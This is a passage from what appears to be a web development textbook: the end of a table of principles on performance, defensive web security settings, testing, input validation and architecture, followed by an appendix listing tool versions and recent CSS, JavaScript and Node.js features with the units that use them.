| P-12 | Set a performance budget (for example: LCP ≤ 2.5 s and INP ≤ 200 ms on a mid-range phone with a slow 4G connection, ≤ 150 KiB of compressed JavaScript on the critical path), measure it automatically in continuous integration (lab), and monitor the 75th percentile of real users (field). | Unit 13.5 |
| P-13 | Defence in depth for every web application: escape by default in the template layer, a strict nonce-based CSP (with Trusted Types where possible), session cookies `__Host-` prefixed, `HttpOnly`, `Secure`, `SameSite=Lax`, CSRF tokens on state-changing requests, `frame-ancestors 'none'` unless framing is needed, HTTPS with HSTS, server-side validation of every input, and dependency hygiene (lockfiles, audits, SRI). | Chapter 14 Project |
| P-14 | Test mostly at the level where bugs are cheapest to find and the tests are fastest and most stable — many unit tests of logic, fewer integration tests of modules talking to each other, and a small number of end-to-end tests of the critical user journeys — and mock only what you do not own or cannot control (time, randomness, the network, payment providers). | Unit 15.3 |
| P-15 | Validate at the boundary and trust inside: parse and validate every external input (bodies, query strings, headers, environment variables) into typed values as soon as it enters, return 4xx with specific messages for bad input, and turn unexpected exceptions into a logged 500 with a generic message. | Unit 16.4 |
| P-16 | Choose the simplest architecture that meets the requirements: a server-rendered site with a little JavaScript for documents and forms; a framework-free SPA like this one for small, long-lived tools; a framework (and its ecosystem of routers, data libraries, and developer tools) when the team, the number of views, or the complexity of shared state grows. Whatever you choose, the platform knowledge underneath — HTTP, the DOM, the event loop, accessibility, security — is the same. | Chapter 17 Project |

# Appendix B — Versions and Recent Platform Features

Every example in this book was run with the tools below. Most of the platform features it relies on are recent; the table lists them with the unit that uses them, so that you can check support for the browsers your users have (MDN's compatibility tables and caniuse.com are the references).

| Tool | Version used |
| --- | --- |
| Node.js | 22.23 |
| Chromium (headless, through Playwright) | 153 |
| Playwright (Python driver and `@playwright/test`) | 1.63 |
| TypeScript | 7.0 (the native compiler) |
| Vite | 8.3 |
| `ws` (WebSocket server for Node.js) | 8.23 |

| Feature | Standard | Where in this book |
| --- | --- | --- |
| `:has()`, `:is()`, `:where()`, `:nth-child(… of S)` | Selectors Level 4 | Units 2.1–2.2 |
| Cascade layers (`@layer`) | CSS Cascade 5 | Unit 2.3, Chapters 3–4 |
| Container queries and container units | CSS Containment 3 | Unit 4.4 |
| CSS nesting, `oklch()`, `color-mix()`, relative colours, `light-dark()` | CSS Nesting 1, CSS Color 4/5 | Unit 4.3 |
| `@property` | CSS Properties and Values API 1 | Unit 4.2 |
| `@starting-style` | CSS Transitions 2 | DT-17 |
| `popover`, `<dialog>` top layer | HTML | DT-12 |
| `Array.prototype.toSorted`, `with`, `findLast` | ES2023 | Unit 5.6 |
| `Object.groupBy`, `Promise.withResolvers` | ES2024 | Units 7.2, Chapter 7 project |
| Iterator helpers (`map`, `filter`, `take` on iterators) | ES2025 | Unit 6.6 |
| `AbortSignal.timeout`, `AbortSignal.any` | DOM | Unit 7.4, Chapter 7 project |
| `scheduler.yield()` | Prioritized Task Scheduling | Unit 7.5, Chapter 13 |
| Form-associated custom elements (`ElementInternals`) | HTML | Chapter 8 project |
| Import maps, top-level `await` | HTML, ES2022 | Unit 9.1 |
| `require()` of ES modules | Node.js 22.12 | Unit 9.2 |
| Type stripping (`node file.ts`) | Node.js 22.18 | Chapter 10 |
| Built-in `WebSocket` client | Node.js 22 | Chapter 11 project |
| `node:sqlite`, `node:test` mock timers | Node.js 22 (experimental) | Chapters 15–16 |
| Trusted Types | W3C Trusted Types | Unit 14.3, Chapter 14 project |

## Habits that changed with these features

- Use cascade layers and `:where()` instead of specificity battles and `!important`.
- Use container queries for components, media queries for page layout.
- Use `AbortSignal` for every cancellable operation, including timeouts.
- Use `structuredClone` instead of JSON round-trips for copying data.
- Use `type="module"` scripts; they are deferred and scoped by default.
